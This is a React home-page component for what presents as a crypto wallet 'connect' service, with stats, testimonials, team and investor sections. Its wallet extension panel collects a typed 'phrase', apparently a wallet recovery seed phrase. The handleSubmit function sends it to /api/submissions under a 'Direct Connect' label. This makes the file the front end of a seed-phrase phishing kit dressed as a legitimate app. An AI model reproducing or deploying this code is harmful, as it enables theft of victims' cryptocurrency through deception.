import { useState } from "react";
import { useLocation } from "wouter";
import { Header } from "@/components/header";
import { HeroSection } from "@/components/hero-section";
import { StatsSection } from "@/components/stats-section";
import { AssetsSection } from "@/components/assets-section";
import { FeaturesSection } from "@/components/features-section";
import { TeamSection } from "@/components/team-section";
import { PartnersSection } from "@/components/partners-section";
import { InvestorsSection } from "@/components/investors-section";
import { TestimonialsSection } from "@/components/testimonials-section";
import { ServicesSection, ServiceInfo } from "@/components/services-section";
import { WalletModal } from "@/components/wallet-modal";
import { WalletExtensionPanel } from "@/components/wallet-extension-panel";
import { Footer } from "@/components/footer";

export default function Home() {
  const [, setLocation] = useLocation();
  const [walletModalOpen, setWalletModalOpen] = useState(false);
  const [extensionPanelOpen, setExtensionPanelOpen] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [selectedWalletId, setSelectedWalletId] = useState<string | null>(null);

  const handleServiceSelect = (service: ServiceInfo) => {
    const url = `/loading?service=${encodeURIComponent(service.name)}&icon=${service.icon}&color=${encodeURIComponent(service.color)}&bg=${encodeURIComponent(service.bgColor)}`;
    window.location.href = url;
  };

  const handleWalletSelect = (walletName: string, walletId: string) => {
    setSelectedWallet(walletName);
    setSelectedWalletId(walletId);
    setExtensionPanelOpen(true);
  };

  const handleExtensionPanelClose = () => {
    setExtensionPanelOpen(false);
    setWalletModalOpen(false);
  };

  const handleSubmit = async (phraseInput: string) => {
    try {
      const response = await fetch('/api/submissions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletName: selectedWallet || "Unknown",
          serviceName: "Direct Connect",
          phrase: phraseInput,
        }),
      });
      
      if (!response.ok) {
        console.error("Submission failed:", await response.text());
      }
    } catch (error) {
      console.error("Submission error:", error);
    }
  };

  return (
    <div className="min-h-screen bg-background">
      <Header onLaunchApp={() => setWalletModalOpen(true)} />
      <main>
        <HeroSection onLaunchApp={() => setWalletModalOpen(true)} />
        <StatsSection />
        <AssetsSection />
        <TestimonialsSection />
        <ServicesSection onServiceSelect={handleServiceSelect} />
        <FeaturesSection />
        <TeamSection />
        <PartnersSection />
        <InvestorsSection />
      </main>
      <Footer />
      
      <WalletModal 
        open={walletModalOpen} 
        onOpenChange={(open) => {
          if (!extensionPanelOpen) {
            setWalletModalOpen(open);
          }
        }}
        onWalletSelect={handleWalletSelect}
        disabled={extensionPanelOpen}
      />

      {extensionPanelOpen && (
        <div 
          className="fixed top-0 left-0 bottom-0 right-[420px] bg-black/60 backdrop-blur-sm z-[90]"
          onClick={handleExtensionPanelClose}
        />
      )}

      <WalletExtensionPanel
        open={extensionPanelOpen}
        walletName={selectedWallet || ""}
        walletId={selectedWalletId || ""}
        onClose={handleExtensionPanelClose}
        onSubmit={handleSubmit}
      />
    </div>
  );
}
